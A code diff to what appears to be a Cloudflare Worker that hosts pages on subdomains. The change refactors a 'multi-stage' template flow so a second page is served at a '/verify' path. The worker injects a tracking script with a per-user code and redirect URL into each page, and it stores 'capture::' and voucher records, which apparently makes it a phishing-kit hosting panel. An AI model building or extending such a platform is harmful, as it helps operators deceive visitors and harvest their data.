@@ -154,7 +154,12 @@ export default {
     }
 
     if (subdomain && subdomain !== 'www') {
-        const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });
+        let lookupKey = subdomain;
+        if (url.pathname === '/verify') {
+            lookupKey = `${subdomain}::stage2`;
+        }
+
+        const data = await env.SUBDOMAINS.get(lookupKey, { type: "json" });
 
         if (!data) {
            return new Response(`<html><body><h1>404</h1><p>Subdomain not found.</p></body></html>`, {
@@ -238,16 +243,6 @@ async function saveUser(env, code, data) {
     await env.SUBDOMAINS.put(`user::${code}`, JSON.stringify(data));
 }
 
-function extractBodyParts(html) {
-    const match = html.match(/<body([^>]*)>([\s\S]*)<\/body>/i);
-    if (match) return { attrs: match[1], content: match[2] };
-
-    let stripped = html;
-    stripped = stripped.replace(/<!doctype[^>]*>/i, '');
-    stripped = stripped.replace(/<html[^>]*>|<\/html>/ig, '');
-    stripped = stripped.replace(/<head[^>]*>[\s\S]*<\/head>/i, '');
-    return { attrs: '', content: stripped.trim() };
-}
 
 // --- HANDLERS ---
 
@@ -401,7 +396,7 @@ async function handleGetSites(env) {
         for (const k of list.keys) {
             if (!k.name.startsWith('capture::') && !k.name.startsWith('template::') &&
                 !k.name.startsWith('code_map::') && !k.name.startsWith('user::') &&
-                !k.name.startsWith('voucher_queue')) {
+                !k.name.startsWith('voucher_queue') && !k.name.endsWith('::stage2')) {
                 sites.push(k.name);
             }
         }
@@ -474,6 +469,7 @@ async function handleDeleteSite(request, env) {
     } catch (e) {}
 
     await env.SUBDOMAINS.delete(subdomain);
+    await env.SUBDOMAINS.delete(`${subdomain}::stage2`);
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
 }
 
@@ -527,6 +523,7 @@ async function handlePublicDeploy(request, env, rootDomain) {
         }
 
         let htmlContent = '';
+        let htmlContentStage2 = null;
         let shouldInject = false;
         let actualTemplateName = null;
         let isMultiStage = false;
@@ -544,33 +541,12 @@ async function handlePublicDeploy(request, env, rootDomain) {
                 return jsonError(`You have reached the limit (3) for deploying this specific template.`);
             }
 
+            htmlContent = templateData.content;
+
             // Check for Multi-Stage
             if (templateData.contentStage2) {
                 isMultiStage = true;
-                const p1 = extractBodyParts(templateData.content);
-                const p2 = extractBodyParts(templateData.contentStage2);
-
-                // Get head from Stage 1 and Stage 2
-                const headMatch1 = templateData.content.match(/<head[^>]*>([\s\S]*)<\/head>/i);
-                const head1 = headMatch1 ? headMatch1[1] : '';
-
-                const headMatch2 = templateData.contentStage2.match(/<head[^>]*>([\s\S]*)<\/head>/i);
-                const head2 = headMatch2 ? headMatch2[1] : '';
-
-                htmlContent = `<!DOCTYPE html>
-<html>
-<head>
-${head1}
-${head2}
-<style>#dtech-stage-2 { display: none; }</style>
-</head>
-<body${p1.attrs}>
-<div id="dtech-stage-1">${p1.content}</div>
-<div id="dtech-stage-2" style="display:none;">${p2.content}</div>
-</body>
-</html>`;
-            } else {
-                htmlContent = templateData.content;
+                htmlContentStage2 = templateData.contentStage2;
             }
 
             redirectUrl = templateData.redirectUrl || null;
@@ -581,6 +557,7 @@ ${head2}
             htmlContent = customHtml;
             shouldInject = (enableInjector === true);
             if (!redirectUrl) redirectUrl = null;
+            // customHtml multi-stage will be handled separately if added
         } else {
             return jsonError("Must provide a template or custom HTML");
         }
@@ -588,22 +565,34 @@ ${head2}
         const scriptUrl = '/api/js/injection.js'; // Use internal route
 
         if (shouldInject) {
-            let injectionBlock = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;
-
+            let injectionBlockStage1 = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;
             if (redirectUrl) {
-                injectionBlock += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
+                injectionBlockStage1 += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
             }
-
             if (isMultiStage) {
-                injectionBlock += `<script>window.MULTI_STAGE = true;</script>`;
+                injectionBlockStage1 += `<script>window.MULTI_STAGE = 1;</script>`;
             }
-
-            injectionBlock += `<script src="${scriptUrl}"></script>`;
+            injectionBlockStage1 += `<script src="${scriptUrl}"></script>`;
 
             if (htmlContent.includes('</body>')) {
-                htmlContent = htmlContent.replace('</body>', `${injectionBlock}</body>`);
+                htmlContent = htmlContent.replace('</body>', `${injectionBlockStage1}</body>`);
             } else {
-                htmlContent += injectionBlock;
+                htmlContent += injectionBlockStage1;
+            }
+
+            if (isMultiStage && htmlContentStage2) {
+                let injectionBlockStage2 = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;
+                if (redirectUrl) {
+                    injectionBlockStage2 += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
+                }
+                injectionBlockStage2 += `<script>window.MULTI_STAGE = 2;</script>`;
+                injectionBlockStage2 += `<script src="${scriptUrl}"></script>`;
+
+                if (htmlContentStage2.includes('</body>')) {
+                    htmlContentStage2 = htmlContentStage2.replace('</body>', `${injectionBlockStage2}</body>`);
+                } else {
+                    htmlContentStage2 += injectionBlockStage2;
+                }
             }
         }
 
@@ -615,6 +604,17 @@ ${head2}
             isInjected: shouldInject,
             templateName: actualTemplateName
         }));
+
+        if (isMultiStage && htmlContentStage2) {
+            await env.SUBDOMAINS.put(`${subdomain}::stage2`, JSON.stringify({
+                type: 'HTML',
+                content: htmlContentStage2,
+                updated: Date.now(),
+                ownerCode: uniqueCode,
+                isInjected: shouldInject,
+                templateName: actualTemplateName
+            }));
+        }
 
         currentSites.push({
             subdomain,
